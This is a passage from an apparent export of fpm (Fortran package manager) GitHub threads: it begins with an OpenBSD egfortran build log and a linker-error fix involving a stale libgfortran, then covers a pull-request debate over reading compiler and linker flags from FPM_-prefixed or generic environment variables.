build/egfortran_5B763526CFC63AF4/fpm/build_dependencies_toml-f_src_tomlf_build.f90.o\n + egfortran -c build/dependencies/toml-f/src/tomlf/de.f90 -static -J build/egfortran_5B763526CFC63AF4/fpm -I build/egfortran_5B763526CFC63AF4/fpm  -o build/egfortran_5B763526CFC63AF4/fpm/build_dependencies_toml-f_src_tomlf_de.f90.o\n + egfortran -c build/dependencies/toml-f/src/tomlf.f90 -static -J build/egfortran_5B763526CFC63AF4/fpm -I build/egfortran_5B763526CFC63AF4/fpm  -o build/egfortran_5B763526CFC63AF4/fpm/build_dependencies_toml-f_src_tomlf.f90.o\n + egfortran -c build/dependencies/toml-f/src/tomlf/all.f90 -static -J build/egfortran_5B763526CFC63AF4/fpm -I build/egfortran_5B763526CFC63AF4/fpm  -o build/egfortran_5B763526CFC63AF4/fpm/build_dependencies_toml-f_src_tomlf_all.f90.o\n + egfortran -c ././src/fpm/toml.f90 -static -J build/egfortran_5B763526CFC63AF4/fpm -I build/egfortran_5B763526CFC63AF4/fpm  -o build/egfortran_5B763526CFC63AF4/fpm/src_fpm_toml.f90.o\n + egfortran -c test/fpm_test/test_toml.f90 -static -J build/egfortran_5B763526CFC63AF4/fpm -I build/egfortran_5B763526CFC63AF4/fpm  -o build/egfortran_5B763526CFC63AF4/fpm/test_fpm_test_test_toml.f90.o\n + egfortran -c ././src/fpm/manifest/build.f90 -static -J build/egfortran_5B763526CFC63AF4/fpm -I build/egfortran_5B763526CFC63AF4/fpm  -o build/egfortran_5B763526CFC63AF4/fpm/src_fpm_manifest_build.f90.o\n + egfortran -c ././src/fpm/manifest/dependency.f90 -static -J build/egfortran_5B763526CFC63AF4/fpm -I build/egfortran_5B763526CFC63AF4/fpm  -o build/egfortran_5B763526CFC63AF4/fpm/src_fpm_manifest_dependency.f90.o\n + egfortran -c ././src/fpm/manifest/install.f90 -static -J build/egfortran_5B763526CFC63AF4/fpm -I build/egfortran_5B763526CFC63AF4/fpm  -o build/egfortran_5B763526CFC63AF4/fpm/src_fpm_manifest_install.f90.o\n + egfortran -c ././src/fpm/manifest/library.f90 -static -J build/egfortran_5B763526CFC63AF4/fpm -I build/egfortran_5B763526CFC63AF4/fpm  -o build/egfortran_5B763526CFC63AF4/fpm/src_fpm_manifest_library.f90.o\n + egfortran -c ././src/fpm/manifest/executable.f90 -static -J build/egfortran_5B763526CFC63AF4/fpm -I build/egfortran_5B763526CFC63AF4/fpm  -o build/egfortran_5B763526CFC63AF4/fpm/src_fpm_manifest_executable.f90.o\n + egfortran -c ././src/fpm/manifest/example.f90 -static -J build/egfortran_5B763526CFC63AF4/fpm -I build/egfortran_5B763526CFC63AF4/fpm  -o build/egfortran_5B763526CFC63AF4/fpm/src_fpm_manifest_example.f90.o\n + egfortran -c ././src/fpm/manifest/test.f90 -static -J build/egfortran_5B763526CFC63AF4/fpm -I build/egfortran_5B763526CFC63AF4/fpm  -o build/egfortran_5B763526CFC63AF4/fpm/src_fpm_manifest_test.f90.o\n + egfortran -c ././src/fpm/manifest/package.f90 -static -J build/egfortran_5B763526CFC63AF4/fpm -I build/egfortran_5B763526CFC63AF4/fpm  -o build/egfortran_5B763526CFC63AF4/fpm/src_fpm_manifest_package.f90.o\n + egfortran -c ././src/fpm/manifest.f90 -static -J build/egfortran_5B763526CFC63AF4/fpm -I build/egfortran_5B763526CFC63AF4/fpm  -o build/egfortran_5B763526CFC63AF4/fpm/src_fpm_manifest.f90.o\n + egfortran -c ././src/fpm/cmd/new.f90 -static -J build/egfortran_5B763526CFC63AF4/fpm -I build/egfortran_5B763526CFC63AF4/fpm  -o build/egfortran_5B763526CFC63AF4/fpm/src_fpm_cmd_new.f90.o\n + egfortran -c test/fpm_test/test_manifest.f90 -static -J build/egfortran_5B763526CFC63AF4/fpm -I build/egfortran_5B763526CFC63AF4/fpm  -o build/egfortran_5B763526CFC63AF4/fpm/test_fpm_test_test_manifest.f90.o\n + egfortran -c ././src/fpm/dependency.f90 -static -J build/egfortran_5B763526CFC63AF4/fpm -I build/egfortran_5B763526CFC63AF4/fpm  -o build/egfortran_5B763526CFC63AF4/fpm/src_fpm_dependency.f90.o\n + egfortran -c test/fpm_test/test_package_dependencies.f90 -static -J build/egfortran_5B763526CFC63AF4/fpm -I build/egfortran_5B763526CFC63AF4/fpm  -o build/egfortran_5B763526CFC63AF4/fpm/test_fpm_test_test_package_dependencies.f90.o\n + egfortran -c ././src/fpm_model.f90 -static -J build/egfortran_5B763526CFC63AF4/fpm -I build/egfortran_5B763526CFC63AF4/fpm  -o build/egfortran_5B763526CFC63AF4/fpm/src_fpm_model.f90.o\n + egfortran -c ././src/fpm/cmd/update.f90 -static -J build/egfortran_5B763526CFC63AF4/fpm -I build/egfortran_5B763526CFC63AF4/fpm  -o build/egfortran_5B763526CFC63AF4/fpm/src_fpm_cmd_update.f90.o\n + egfortran -c ././src/fpm_source_parsing.f90 -static -J build/egfortran_5B763526CFC63AF4/fpm -I build/egfortran_5B763526CFC63AF4/fpm  -o build/egfortran_5B763526CFC63AF4/fpm/src_fpm_source_parsing.f90.o\n + egfortran -c ././src/fpm_targets.f90 -static -J build/egfortran_5B763526CFC63AF4/fpm -I build/egfortran_5B763526CFC63AF4/fpm  -o build/egfortran_5B763526CFC63AF4/fpm/src_fpm_targets.f90.o\n + egfortran -c test/fpm_test/test_source_parsing.f90 -static -J build/egfortran_5B763526CFC63AF4/fpm -I build/egfortran_5B763526CFC63AF4/fpm  -o build/egfortran_5B763526CFC63AF4/fpm/test_fpm_test_test_source_parsing.f90.o\n + egfortran -c ././src/fpm_backend.f90 -static -J build/egfortran_5B763526CFC63AF4/fpm -I build/egfortran_5B763526CFC63AF4/fpm  -o build/egfortran_5B763526CFC63AF4/fpm/src_fpm_backend.f90.o\n + egfortran -c ././src/fpm_sources.f90 -static -J build/egfortran_5B763526CFC63AF4/fpm -I build/egfortran_5B763526CFC63AF4/fpm  -o build/egfortran_5B763526CFC63AF4/fpm/src_fpm_sources.f90.o\n + egfortran -c ././src/fpm.f90 -static -J build/egfortran_5B763526CFC63AF4/fpm -I build/egfortran_5B763526CFC63AF4/fpm  -o build/egfortran_5B763526CFC63AF4/fpm/src_fpm.f90.o\n + egfortran -c test/fpm_test/test_module_dependencies.f90 -static -J build/egfortran_5B763526CFC63AF4/fpm -I build/egfortran_5B763526CFC63AF4/fpm  -o build/egfortran_5B763526CFC63AF4/fpm/test_fpm_test_test_module_dependencies.f90.o\n + egfortran -c ././src/fpm/cmd/install.f90 -static -J build/egfortran_5B763526CFC63AF4/fpm -I build/egfortran_5B763526CFC63AF4/fpm  -o build/egfortran_5B763526CFC63AF4/fpm/src_fpm_cmd_install.f90.o\n + ar -rs build/egfortran_5B763526CFC63AF4/fpm/libfpm.a build/egfortran_5B763526CFC63AF4/fpm/src_filesystem_utilities.c.o build/egfortran_5B763526CFC63AF4/fpm/src_fpm.f90.o build/egfortran_5B763526CFC63AF4/fpm/src_fpm_backend.f90.o build/egfortran_5B763526CFC63AF4/fpm/src_fpm_command_line.f90.o build/egfortran_5B763526CFC63AF4/fpm/src_fpm_compiler.f90.o build/egfortran_5B763526CFC63AF4/fpm/src_fpm_environment.f90.o build/egfortran_5B763526CFC63AF4/fpm/src_fpm_filesystem.F90.o build/egfortran_5B763526CFC63AF4/fpm/src_fpm_model.f90.o build/egfortran_5B763526CFC63AF4/fpm/src_fpm_os.F90.o build/egfortran_5B763526CFC63AF4/fpm/src_fpm_source_parsing.f90.o build/egfortran_5B763526CFC63AF4/fpm/src_fpm_sources.f90.o build/egfortran_5B763526CFC63AF4/fpm/src_fpm_strings.f90.o build/egfortran_5B763526CFC63AF4/fpm/src_fpm_targets.f90.o build/egfortran_5B763526CFC63AF4/fpm/src_fpm_dependency.f90.o build/egfortran_5B763526CFC63AF4/fpm/src_fpm_error.f90.o build/egfortran_5B763526CFC63AF4/fpm/src_fpm_git.f90.o build/egfortran_5B763526CFC63AF4/fpm/src_fpm_installer.f90.o build/egfortran_5B763526CFC63AF4/fpm/src_fpm_manifest.f90.o build/egfortran_5B763526CFC63AF4/fpm/src_fpm_toml.f90.o build/egfortran_5B763526CFC63AF4/fpm/src_fpm_versioning.f90.o build/egfortran_5B763526CFC63AF4/fpm/src_fpm_cmd_install.f90.o build/egfortran_5B763526CFC63AF4/fpm/src_fpm_cmd_new.f90.o build/egfortran_5B763526CFC63AF4/fpm/src_fpm_cmd_update.f90.o build/egfortran_5B763526CFC63AF4/fpm/src_fpm_manifest_build.f90.o build/egfortran_5B763526CFC63AF4/fpm/src_fpm_manifest_dependency.f90.o build/egfortran_5B763526CFC63AF4/fpm/src_fpm_manifest_example.f90.o build/egfortran_5B763526CFC63AF4/fpm/src_fpm_manifest_executable.f90.o build/egfortran_5B763526CFC63AF4/fpm/src_fpm_manifest_install.f90.o build/egfortran_5B763526CFC63AF4/fpm/src_fpm_manifest_library.f90.o build/egfortran_5B763526CFC63AF4/fpm/src_fpm_manifest_package.f90.o build/egfortran_5B763526CFC63AF4/fpm/src_fpm_manifest_test.f90.o build/egfortran_5B763526CFC63AF4/fpm/build_dependencies_toml-f_src_tomlf.f90.o build/egfortran_5B763526CFC63AF4/fpm/build_dependencies_toml-f_src_tomlf_all.f90.o build/egfortran_5B763526CFC63AF4/fpm/build_dependencies_toml-f_src_tomlf_build.f90.o build/egfortran_5B763526CFC63AF4/fpm/build_dependencies_toml-f_src_tomlf_constants.f90.o build/egfortran_5B763526CFC63AF4/fpm/build_dependencies_toml-f_src_tomlf_datetime.f90.o build/egfortran_5B763526CFC63AF4/fpm/build_dependencies_toml-f_src_tomlf_de.f90.o build/egfortran_5B763526CFC63AF4/fpm/build_dependencies_toml-f_src_tomlf_error.f90.o build/egfortran_5B763526CFC63AF4/fpm/build_dependencies_toml-f_src_tomlf_ser.f90.o build/egfortran_5B763526CFC63AF4/fpm/build_dependencies_toml-f_src_tomlf_structure.f90.o build/egfortran_5B763526CFC63AF4/fpm/build_dependencies_toml-f_src_tomlf_type.f90.o build/egfortran_5B763526CFC63AF4/fpm/build_dependencies_toml-f_src_tomlf_utils.f90.o build/egfortran_5B763526CFC63AF4/fpm/build_dependencies_toml-f_src_tomlf_version.f90.o build/egfortran_5B763526CFC63AF4/fpm/build_dependencies_toml-f_src_tomlf_build_array.f90.o build/egfortran_5B763526CFC63AF4/fpm/build_dependencies_toml-f_src_tomlf_build_keyval.f90.o build/egfortran_5B763526CFC63AF4/fpm/build_dependencies_toml-f_src_tomlf_build_merge.f90.o build/egfortran_5B763526CFC63AF4/fpm/build_dependencies_toml-f_src_tomlf_build_table.f90.o build/egfortran_5B763526CFC63AF4/fpm/build_dependencies_toml-f_src_tomlf_de_character.f90.o build/egfortran_5B763526CFC63AF4/fpm/build_dependencies_toml-f_src_tomlf_de_tokenizer.f90.o build/egfortran_5B763526CFC63AF4/fpm/build_dependencies_toml-f_src_tomlf_structure_base.f90.o build/egfortran_5B763526CFC63AF4/fpm/build_dependencies_toml-f_src_tomlf_structure_vector.f90.o build/egfortran_5B763526CFC63AF4/fpm/build_dependencies_toml-f_src_tomlf_type_array.f90.o build/egfortran_5B763526CFC63AF4/fpm/build_dependencies_toml-f_src_tomlf_type_keyval.f90.o build/egfortran_5B763526CFC63AF4/fpm/build_dependencies_toml-f_src_tomlf_type_table.f90.o build/egfortran_5B763526CFC63AF4/fpm/build_dependencies_toml-f_src_tomlf_type_value.f90.o build/egfortran_5B763526CFC63AF4/fpm/build_dependencies_toml-f_src_tomlf_utils_convert.f90.o build/egfortran_5B763526CFC63AF4/fpm/build_dependencies_toml-f_src_tomlf_utils_verify.f90.o build/egfortran_5B763526CFC63AF4/fpm/build_dependencies_M_CLI2_src_M_CLI2.f90.o\nar: creating build/egfortran_5B763526CFC63AF4/fpm/libfpm.a\n + egfortran -c app/main.f90 -static -J build/egfortran_5B763526CFC63AF4/fpm -I build/egfortran_5B763526CFC63AF4/fpm  -o build/egfortran_5B763526CFC63AF4/fpm/app_main.f90.o\n + egfortran -c test/cli_test/cli_test.f90 -static -J build/egfortran_5B763526CFC63AF4/fpm -I build/egfortran_5B763526CFC63AF4/fpm  -o build/egfortran_5B763526CFC63AF4/fpm/test_cli_test_cli_test.f90.o\n + egfortran -c test/fpm_test/test_backend.f90 -static -J build/egfortran_5B763526CFC63AF4/fpm -I build/egfortran_5B763526CFC63AF4/fpm  -o build/egfortran_5B763526CFC63AF4/fpm/test_fpm_test_test_backend.f90.o\n + mkdir -p build/egfortran_5B763526CFC63AF4/app/\n + egfortran  -static -J build/egfortran_5B763526CFC63AF4/fpm -I build/egfortran_5B763526CFC63AF4/fpm  build/egfortran_5B763526CFC63AF4/fpm/app_main.f90.o build/egfortran_5B763526CFC63AF4/fpm/libfpm.a -o build/egfortran_5B763526CFC63AF4/app/fpm\n + mkdir -p build/egfortran_5B763526CFC63AF4/test/\n + egfortran  -static -J build/egfortran_5B763526CFC63AF4/fpm -I build/egfortran_5B763526CFC63AF4/fpm  build/egfortran_5B763526CFC63AF4/fpm/test_cli_test_cli_test.f90.o build/egfortran_5B763526CFC63AF4/fpm/libfpm.a -o build/egfortran_5B763526CFC63AF4/test/cli-test\n + egfortran -c test/fpm_test/main.f90 -static -J build/egfortran_5B763526CFC63AF4/fpm -I build/egfortran_5B763526CFC63AF4/fpm  -o build/egfortran_5B763526CFC63AF4/fpm/test_fpm_test_main.f90.o\n + egfortran  -static -J build/egfortran_5B763526CFC63AF4/fpm -I build/egfortran_5B763526CFC63AF4/fpm  build/egfortran_5B763526CFC63AF4/fpm/test_help_test_help_test.f90.o build/egfortran_5B763526CFC63AF4/fpm/libfpm.a -o build/egfortran_5B763526CFC63AF4/test/help-test\n + egfortran  -static -J build/egfortran_5B763526CFC63AF4/fpm -I build/egfortran_5B763526CFC63AF4/fpm  build/egfortran_5B763526CFC63AF4/fpm/test_new_test_new_test.f90.o build/egfortran_5B763526CFC63AF4/fpm/libfpm.a -o build/egfortran_5B763526CFC63AF4/test/new-test\n + egfortran  -static -J build/egfortran_5B763526CFC63AF4/fpm -I build/egfortran_5B763526CFC63AF4/fpm  build/egfortran_5B763526CFC63AF4/fpm/test_fpm_test_main.f90.o build/egfortran_5B763526CFC63AF4/fpm/test_fpm_test_testsuite.f90.o build/egfortran_5B763526CFC63AF4/fpm/test_fpm_test_test_toml.f90.o build/egfortran_5B763526CFC63AF4/fpm/test_fpm_test_test_manifest.f90.o build/egfortran_5B763526CFC63AF4/fpm/test_fpm_test_test_filesystem.f90.o build/egfortran_5B763526CFC63AF4/fpm/test_fpm_test_test_source_parsing.f90.o build/egfortran_5B763526CFC63AF4/fpm/test_fpm_test_test_module_dependencies.f90.o build/egfortran_5B763526CFC63AF4/fpm/test_fpm_test_test_package_dependencies.f90.o build/egfortran_5B763526CFC63AF4/fpm/test_fpm_test_test_backend.f90.o build/egfortran_5B763526CFC63AF4/fpm/test_fpm_test_test_installer.f90.o build/egfortran_5B763526CFC63AF4/fpm/test_fpm_test_test_versioning.f90.o build/egfortran_5B763526CFC63AF4/fpm/libfpm.a -o build/egfortran_5B763526CFC63AF4/test/fpm-test\n# Update: build/egfortran_5B763526CFC63AF4/app/fpm -> /home/aaron/.local/bin\n$\n\n\n\nError log without static\n(Note: I had run doas pkg_delete -a before running the below)\n$ egfortran --version\nGNU Fortran (GCC) 11.2.0\nCopyright (C) 2021 Free Software Foundation, Inc.\nThis is free software; see the source for copying conditions.  There is NO\nwarranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.\n\n$ git clone https://github.com/fortran-lang/fpm\nCloning into 'fpm'...\nremote: Enumerating objects: 25639, done.\nremote: Counting objects: 100% (10143/10143), done.\nremote: Compressing objects: 100% (702/702), done.\nremote: Total 25639 (delta 9458), reused 10025 (delta 9390), pack-reused 15496\nReceiving objects: 100% (25639/25639), 8.05 MiB | 2.83 MiB/s, done.\nResolving deltas: 100% (22457/22457), done.\n$ cd fpm\n$ FC=egfortran ./install.sh\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100   621  100   621    0     0   1605      0 --:--:-- --:--:-- --:--:--  1612\n100  826k  100  826k    0     0   894k      0 --:--:-- --:--:-- --:--:--  894k\nld: error: undefined symbol: _gfortran_os_error_at\n>>> referenced by fpm.F90:7128 (build/bootstrap/fpm.F90:7128)\n>>>               /tmp//ccOMmdSJ.o:(__m_cli2_MOD_remove_l)\n>>> referenced by fpm.F90:7130 (build/bootstrap/fpm.F90:7130)\n>>>               /tmp//ccOMmdSJ.o:(__m_cli2_MOD_remove_l)\n>>> referenced by fpm.F90:7130 (build/bootstrap/fpm.F90:7130)\n>>>               /tmp//ccOMmdSJ.o:(__m_cli2_MOD_remove_l)\n>>> referenced 254 more times\ncollect2: error: ld returned 1 exit status\n$"
                },
                {
                    "user": "brocolis",
                    "date": "2021-09-01 00:05:21+00:00",
                    "text": "Any ideas why -static would be required?\n\nI believe there's libgfortran.so shared library from the old installation (gcc-8) in /usr/local/lib, and when you use -static, the linker uses libgfortran.a from gcc-11.\nI'd check the file times, they should be equal:\n# ls -l /usr/local/lib/libgfortran*\n-rw-r--r--  1 root  bin  14044376 Aug 30 08:04 /usr/local/lib/libgfortran.a\n-rwxr-xr-x  1 root  bin       985 Aug 30 08:04 /usr/local/lib/libgfortran.la\n-rw-r--r--  1 root  bin   6694400 Aug 30 08:04 /usr/local/lib/libgfortran.so.9.0\n-rw-r--r--  1 root  bin       269 Aug 30 08:04 /usr/local/lib/libgfortran.spec\nIf the file times are different, I'd remove and reinstall g95 and gcc-libs-. I've tried again in another clean directory,  and it works in my openbsd. I don't need to add -static to the command line."
                },
                {
                    "user": "AshyIsMe",
                    "date": "2021-09-01 10:33:24+00:00",
                    "text": "Thanks you were right.  It's building for me now too without -static."
                }
            ]
        },
        {
            "number": 549,
            "user": "awvwgk",
            "date": "2021-08-28 11:59:17+00:00",
            "title": "Allow setting, archiver, C compiler flags and linker flags from commandline",
            "text": "Read Fortran compiler from FPM_FC or --compiler (deprecate FPM_COMPILER)\nRead Fortran compiler options from FPM_FFLAGS or --flag\nRead C compiler from FPM_CC or --c-compiler (deprecate FPM_C_COMPILER)\nRead C compiler options from FPM_CFLAGS or --c-flag\nRead archiver from FPM_AR or --archiver\nRead linker options from FPM_LDFLAGS or --link-flag\n\nCloses #529",
            "comments": [
                {
                    "user": "urbanjost",
                    "date": "2021-08-28 18:36:15+00:00",
                    "text": "Well, lets ask for general feedback now that there has been a lot more use of fpm(1) things might have changed since the last go-around(?)\nNot sure I am impartial enough to review this, as I had previous PRs to\nadd --flag and use of environment variables, such as #235 :> .\nSo I think some of the voices against doing this in the past should be\nheard from once again to see if stances have changed.\nOn a more specific note do you really need separate functions to pull the\nenvironment variable values? The new functions are essentially a single\nline with a nested get_env(3f) call; but it might allow for further\nprocessing to handle things like when FC has FFLAG options or is a full\npathname, so not strongly opposed to it, but a few comments specifying\nwhy that choice was made and for use by Ford(1) would be useful. Really\nhoping we make a habit of having !> comments in all new procedures.\nPrevious discussions included the pros and cons of the use of environment\nvariables when switching compilers, which for base cases fpm(1) does\nvery simply but environment variables complicate very significantly,\nas compilers vary. Perhaps an --ignoreenv flag might be useful in this\nregard, or the default could be to disregard the non-FPM_* specific\nvariables unless an -env flag was added.\nIn a previous variant the variables were only used for an unknown\ncompiler.\nThe general preference seemed to be the use of unique FPM_* names instead\nof common FC, FFLAGS ... (but not standardized) variables as they are\nused by other build tools in different ways. Make and CMake and other\ntools do or do not allow FC to contain compiler options, to use full\npathnames, etc. fpm(1) uses the compiler name assuming it is just a leaf\nname to identify profiles, etc.  So instead of removing the C compiler\nvariable, in this vein you would actually make sure their was an FPM_\nvariable for each general variable instead of removing the C compiler\none; and that FPM_* variables would always override, not concatenate\nwith the old make(1)-derived ones.\nThe thought earlier was that the FPM_* names could be multiple\nvalues in the syntax of the manifest file so they could contain\nthings like a compiler name to associate to the flags, and having\na unique prefix prevents them from conflicting with other flags.\nSince the manifest format was not settled at the time, some syntax like\nFPM_FLAG='gfortran -O2:ifort -O3:...' was discussed, somewhat like $PATH\nand $LD_LIBRARY_PATH.\nSome compilers already make use of the same variable names and/or have\nother options like config files to set options, so it was not clear what\npossibly duplicating the values might have.\nDoing this through the manifest file encourages the proper arguments\nare packaged for use by other packages, and can be compiler-specific,\navoiding a lot of the issues mentioned here.\nAnother solution is/was the use of response files, so you can have\ncompiler and platform-specific switches in a file that you can invoke\nlike \"fpm build @timing\", that is available via the M_CLI2 command-line\nparser but never seemed to garner much use (outside of me, perhaps!).\nSince one of the stated goals of fpm(1) is to easily generate a\nreproducable build, and the use of the environment variables means\nintroducing external complexities the previous PRs were withdrawn.\nAll that being said everything is working so far. Assuming the main\nadvantage gained is not having to specify the variables on the various\nfpm(1) commands (which a manifest file would address on a per-package\nbasis but not as nicely when going in-between packages unless \"global\"\nprofiles are supported, which breaks the \"package\" paradigm) and that\nthe use and meaning of these variable names is in no way standardized,\njust common I think they should be ignored unless a switch or other\nvariable is present (such as $FPM_USE_ENV=YES?).\nI assume you are commonly using the same variables with Cmake(1) or some\nother package? There were several issues/PRs about this, I will try to\nfind the numbers.\nThat being said, I will continue reviewing this as a go-forward proposal\nand leave it up to a general discussion otherwise, as at least at one\ntime I thought it was a good idea (see #235) , and I believe matched the Haskell\nversion behavior as well. Will be interesting to see if the concensus\nhas changed, as --flag was added after being originally rejected.\nAll the testing so far works. Would be interested in a discussion of\nyour general use case. Pretty sure there were some other issues/PRs/discussions\nsurrounding this so anyone feel free to add those."
                },
                {
                    "user": "urbanjost",
                    "date": "2021-08-28 18:47:11+00:00",
                    "text": "PS;\nEvery time I pull and build a PR I keep forgetting the last way I did it; but I like to do it from the CLI so I complicate it for myself I suppose. Maybe we should add instructions in the Discussion section for things like doing an initial build from scratch and several of the ways to pull and build\na PR, especially for newcomers?  Right after I typed in something that worked after two failures I remembered I had an alias for this in my .gitconfig that did it a different way :>\nThis time I used\ngit clone https://github.com/fortran-lang/fpm\ncd fpm\ngit fetch origin pull/549/head:pull_549\ngit checkout pull_549\nfpm build # I already have an fpm(1) on this machine\ngit diff master"
                },
                {
                    "user": "awvwgk",
                    "date": "2021-08-28 18:52:05+00:00",
                    "text": "Every time I pull and build a PR I keep forgetting the last way I did it; but I like to do it from the CLI so I complicate it for myself I suppose. Maybe we should add instructions in the Discussion section for things like doing an initial build from scratch and several of the ways to pull and build\n\nThere used to be a pop-up in the code button at the top right with the git instructions, but those have been removed after GitHub CLI was released.\nI use\ngit fetch git@github.com:fortran-lang/fpm pull/549/head\ngit checkout FETCH_HEAD"
                },
                {
                    "user": "urbanjost",
                    "date": "2021-08-29 00:22:59+00:00",
                    "text": "Not sure if there is an advantage to one or the other right off the cuff, but missed \"gh\" being released. Installed it. Interesting. First thing that looks appealing is the issues command for listing and entering issues without having to type in these GUIs. Thanks. All the tests I have run so far are working, wondering about FFLAGS versus F90FLAGS, as FFLAGS is often associated with pre-F90 code; also what about LDFLAGS and CPPFLAGS, probably use more frequently than AR.  What should be the criteria for which flags are supported?\nOut of curiosity I can a scan and out of several million lines of files related to Make and CMake these were the closest to \"standard\" names I could find in Fortran-related files  (far more containing C-related names than I imaged at > 30/100, which seems out of sorts, but many Fortran projects are private, I suspect):\nAR         ARCH     ARFLAGS  CC        CCFLAGS   CCOPTS  CF77        CF77FLAGS\nCF90FLAGS  CFLAGS   COPT     COPTIONS  CPPFLAGS  CXX     CXX11FLAGS  CXXFLAGS\nCXXOPTS    FC       CF90     F77OPT    FOPTIONS  FPP     FPPFLAGS    INCLUDES\nINSTALL    LDFLAGS  LFLAGS   LIB       PREFIX    TMPDIR\n\nwith the vast majority using similar names with \"project\" prefixes (often lowercase), which was also interesting. What it did show was there is a lot of variability in what names are used."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-08-29 02:51:19+00:00",
                    "text": "I'm currently looking into meson and cmake to figure out which environment variables they support and conda-build for a number of environment variables which are usually set from a packager for a build system.\n\nalso what about LDFLAGS and CPPFLAGS, probably use more frequently than AR. What should be the criteria for which flags are supported?\n\nCFLAGS and LDFLAGS are two variables which we should support as well, I'll look into those."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-08-29 05:51:44+00:00",
                    "text": "All that being said everything is working so far. Assuming the main\nadvantage gained is not having to specify the variables on the various\nfpm(1) commands (which a manifest file would address on a per-package\nbasis but not as nicely when going in-between packages unless \"global\"\nprofiles are supported, which breaks the \"package\" paradigm) and that\nthe use and meaning of these variable names is in no way standardized,\njust common I think they should be ignored unless a switch or other\nvariable is present (such as $FPM_USE_ENV=YES?).\n\nI see the main purpose of the flag options to add package independent options, like building against a custom sysroot when building relocatable packages.\nI think we could have a ~/.fpmconfig or ~/.config/fpm/config.toml file where one could disable such behaviour globally. So far I didn't saw a good use-case for adding support for a global config file, but maybe we should look into this in the near future."
                },
                {
                    "user": "milancurcic",
                    "date": "2021-08-29 17:44:47+00:00",
                    "text": "I don't recommend relying on these generic but common environment variables. One relevant discussion about this is in #444.\nI do think there is value in having a way to control fpm behavior independent of the package. And I like using environment variables.\nI would support this if we namespaced any fpm variable with FPM_, so I think FPM_FC, FPM_CC, etc.or similar would be fine.\nThis is a big design decision so I will request review from a few more people."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-08-29 18:24:47+00:00",
                    "text": "I think there is merit in supporting the most common environment\nvariables in fpm, rather than rolling our own.\n\nMy motivation for this change is coming from my experience with\npackaging fpm. Fpm could have the capability to work just as\n\n    fpm install --prefix \"$PREFIX\"\n\nfor quite a few package ecosystems. But right now it is just tedious,\nbecause the packager has to remember that fpm works differently than\nother build systems and fixup the environment first\n\n    export FPM_COMPILER=\"${FC}\"\n    export FPM_C_COMPILER=\"${CC}\"\n    fpm install --prefix \"$PREFIX\" --flag \"${LDFLAGS} ${FFLAGS}\"\n\nWithout fixing up the environment first, the build might be broken.\n\nIf you look into conda-build the Fortran environment variables are\nalready quite a few, I really would prefer to not add more to the list\nwith fpm."
                },
                {
                    "user": "certik",
                    "date": "2021-08-29 19:03:17+00:00",
                    "text": "That's a valid use case. We could fix it with:\nfpm install --prefix \"$PREFIX\" --use-env-variables\n\nI am really worried about this design if we enable it by default. In order to move forward, let's enable this behavior with an option. That way in the Conda build file the build will be trivial, and that way we are not stopping progress. However, we need to meet and design this properly."
                },
                {
                    "user": "urbanjost",
                    "date": "2021-08-29 22:01:45+00:00",
                    "text": "In the previous discussions the one that got the most likes was\n program demo_M_CLI2\nuse M_CLI2,  only : set_args, sget, specified\nuse M_CLI2,  only : filenames=>unnamed\ncharacter(len=:),allocatable :: env\ncall set_args(' -env \" \"')\nenv=sget('env')\nif(specified('env'))write(*,*)'env is specified'\nwrite(*,*)'env is ['//env//']', len(sget('env'))\nend program demo_M_CLI2\n! if -env not present environment variables are not used\n! if -env present with no value use FPM_*\n! if -env with NULL string use names CC, FC, LDFLAGS, FFLAGS,AR\n! if -env with a value use that, allowing for individual sets per compiler, per ...\nThat is, the fpm command did not use environment variables (that would be a change, as FPM_COMPILER has been around for a while now) by default, but if the -env flag were present it would use names with the FPM_ prefix if no value was given, else if any other value was given it would be used as a suffix with an underscore between the prefix and the supported names, unless the value was a null string, in which case the plain names would be used. If activiated, the specific one would be looked for and if not found the FPM_* name would be looked for.\nThis would allow you to set up defaults for a specific compiler like IFORT_FC=ifort, IFORT_FFLAGS='....' or for a specific type of compile like  PROFILE_FFLAGS='-pg -O0'  and then enter fpm build -env PROFILE, or fpm build -env IFORT.  There was debate on whether if a name was specified FPM_ should be the backup or not. So for the packaging option it would just be\nfpm install --prefix \"$PREFIX\" --env\nfpm build -env  # would be equivalent to \"fpm build -env FPM\"\nfpm build -env IFORT  # would use IFORT_* instead of FPM_* names\nand the FC, FFLAGS, AR, LDFLAGS, ... values would be used. This works with the command parser because strings have to be declared as at least one space in SETARGS(3f)  but when used a null string is allowed; also I also just use a default value no one would ever use, normally \"#N#\" and if the value is set to that but specified(3f) is .TRUE. I know the keyword was specified but no value.\nAs has come up before about making sure the values are used to create a unique build this is already an issue with several compilers (or a feature, depending on what you want to do). The Intel compiler lets you specify prefix and suffix environment variables for the compile line, and allows for pointing to a config file.  We used to use the config file extensively to set the defaults for the site to a specific set of parameters we found gave us highly reproducable values and good performance across multiple platforms, and also made static libraries the default.  Very handy, (the white paper about which parameters to use is unfortunately not public but was worth it and I recommend others do that, as an aside).  But it did cause problems with some COTS products that compiled Fortran (particularly ABAQUS) so you had to use modules or wrappers to turn it off in some cases.  That is a bit of an aside, but it is worth noting several compilers have features that bypass the fpm feature of creating a unique build directory for each set of compiler options, but file-specific profiles will do that too; but I have thought about whether fpm needed a feature to unset such variables.  In the previous discussions it was hoped that profiles would eliminate the need for environment variables to a large extent.\nA major appeal of fpm(1) is that a new user can start building projects virtually \"out of the box\". If we complicate usage with too many options to satisfy a small populations' needs such as making it easier to package we risk having some of the same complaints made against other packaging utilities from make(1) and cmake(1) on, that the learning curve for learning how to use the packager for developers is way to high."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-08-30 07:07:34+00:00",
